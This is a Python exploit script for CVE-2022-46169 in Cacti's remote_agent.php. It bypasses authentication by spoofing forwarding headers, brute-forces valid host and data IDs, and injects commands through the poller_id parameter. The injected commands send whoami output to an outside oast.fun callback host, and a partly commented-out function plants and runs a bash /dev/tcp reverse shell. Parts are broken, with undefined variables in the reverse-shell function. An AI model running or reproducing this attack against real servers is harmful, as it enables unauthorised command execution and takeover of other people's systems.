#! /usr/bin/python3 
 
'''
CVE-2022-46169
Author: @_ce3rb3ru5__
Refactor: @CaptainTiz

'''
import requests
import argparse
import random
import sys
import json



# supress tls warning
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# remember to change the IP and PORT for reverse shell
IP= "0.0.0.0"
PORT="1234"

# Proxy Headers Array
ip_forward_headers = ['X-Forwarded-For',
		'X-Client-IP',
		'X-Real-IP',
		'X-ProxyUser-Ip',
		'CF-Connecting-IP',
		'True-Client-IP',
		'HTTP_X_FORWARDED',
		'HTTP_X_FORWARDED_FOR',
		'HTTP_X_CLUSTER_CLIENT_IP',
		'HTTP_FORWARDED_FOR',
		'HTTP_FORWARDED',
		'HTTP_CLIENT_IP',
		'REMOTE_ADDR']

final_args = []
good_args = []
argP = argparse.ArgumentParser()

argP.add_argument("-u", "--url", dest = "url", help="Victim URL")
argP.add_argument("-f", "--forwarded", dest = "forward" ,help="X-Forwarded value to bypass the auth")
argP.add_argument("-m", "--mode", dest="mode", help="Exploit mode: Exploit Vulnerability\nCheck Mode: Check for auth bypass and vulnerable id")

args = argP.parse_args()



def bypass(url):
    #auth bypass -------------------------------------
    #you can bypass this with 127.0.0.1 or with the victim's IP itself
    # req = requests.get(url, headers=headers, verify=False)
    print("[+] Bypassing auth...")
    for header in ip_forward_headers:
        # print(header)
        # Find Auth Bypass Header
        headers = {header:args.forward}
        req = requests.get(url, headers=headers, verify=False)
        #print("[DBG]: "+ req.text + "\n"+str(req.status_code))
        #print("[DBG]Bypass Method: "+ str(headers))
        if req.text != "FATAL: You are not authorized to use this service" and req.status_code != 403:
            print("[+] Bypassing success!")
            #bruteforce(headers)
            # cmd_inject(bruteforce(headers), headers)
            return headers
        else:
            print("[+]Bypassing failed.")
            print("[+]Not vulnerable or X-Forwarded value was wrong.")
    # exit on failed 
    sys.exit()


def bruteforce(header):
    #bruteforce -------------------------------------
    print("[+] Bruteforcing host_id and local_data_ids[] args.")
    final_args=[]
    exploitable = False
    #this will bruteforce the host_id and local_data_ids[] to find some valid value and save it 
    host_id_arr=''
    #headers = {header:args.forward}
    for i in range(1,20):
        host_id_arr = "&host_id="+str(i)
        local_data_ids=''
        for f in range(1,90):
            local_data_ids+='&local_data_ids[]='+str(f)
            #brute_url = args.url+"/remote_agent.php?action=polldata&poller_id=1&host_id="+str(i)+"&local_data_ids[]="+str(f)
        brute_url = args.url+"/remote_agent.php?action=polldata&poller_id=1"+host_id_arr+local_data_ids
        # print(brute_url)
        brute_req = requests.get(brute_url, headers=header, verify=False)
        if brute_req.text != "[]":
            #print(brute_req.text)
            valid_data_ids = json.loads(brute_req.text)
            # print(valid_data_ids)
            exploitable = checker(valid_data_ids)
            for data_id in valid_data_ids:
                final_args.append("host_id="+str(i)+"&local_data_ids[]="+str(data_id["local_data_id"]))
    return list(set(final_args)), exploitable
                #final_args="host_id="+str(i)+"&local_data_ids[]="+str(f)
        #if "cmd.php" in final_args:
         #   print("[+] Bruteforce success!")
        #else:
         #   print("[+] Bruteforce failed.")
          #  print("[+] cmd.php not present.")`

def checker(json):
    for item in json:
        if item["rrd_name"] == "polling_time":
            #print("[+] Exploitable ID Found!")
            return True
        else:
            #print("[-] Not Exploitable")
            return False

def cmd_inject(final_headers, header) :  
    #command injection ------------------------------------
    count = 0
    for test in final_headers:
        count+=1
        inject_url = args.url+"remote_agent.php?action=polldata&poller_id=;ping%20-c%202%20`whoami`."+str(count)+"."+"cf2f2yb2vtc0000tbx20g8t8txcyyyyyb.oast.fun&"+test
        # print(inject_url)
        print("[DBG] testing valid ids: "+ str(count)+"/"+str(len(final_headers)))
        inject_req = requests.get(inject_url, headers=header, verify=False)
        #get_textfile = requests.get(args.url+"/test.txt",headers=headers, verify=False)
        if inject_req.status_code == 200:
            print("[+] Check Interactsh!")

            #remove the file created above
            #inject_url = args.url+"/remote_agent.php?action=polldata&poller_id=;rm%20test.txt&"+j
            #requests.get(inject_url,headers=headers)

def rce():
    # remote code execution -----------------------------------
    #here we create and deliver the payload into the actual directory 
    #payload_url = f"{args.url}/remote_agent.php?action=polldata&poller_id=;echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22%20%3E%20shell.sh&{random.choice(good_args)}"
    print("[+] sending the payload...")
    requests.get(payload_url, headers=headers)
    print("[+] running the exploit...")
    #right here we execute the payload that we already upload
    for a in good_args:
        rce_url = args.url+"/remote_agent.php?action=polldata&poller_id=;bash%20shell.sh&"+a
        req_rce = requests.get(rce_url,headers=headers, verify=False)
        print(req_rce.text)

def main():
    url=f"{args.url}/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=1"
    headers={}
    if args.url is not None:
        if args.mode == "exploit":
            #print(f"Target URL: {args.url} ")
            headers = bypass(url)
            results, is_exploitable = bruteforce(headers)
            #print(headers)
            if is_exploitable: 
                print("toy aqui")
                cmd_inject(results, headers)
                sys.exit()
            else:
                print("[-] Server Not Vulnerable. :(")
                sys.exit()

        
        if args.mode == "check":
            headers = bypass(url)
            results, is_exploitable = bruteforce(headers)
            if is_exploitable:
                print("[+] Server Vulnerable!")
                sys.exit()
            else:
                print("[-] Server Not Vulnerable. :(")
                sys.exit()
        argP.print_help()
    else:
        argP.print_help()

if __name__ == "__main__":
    main()


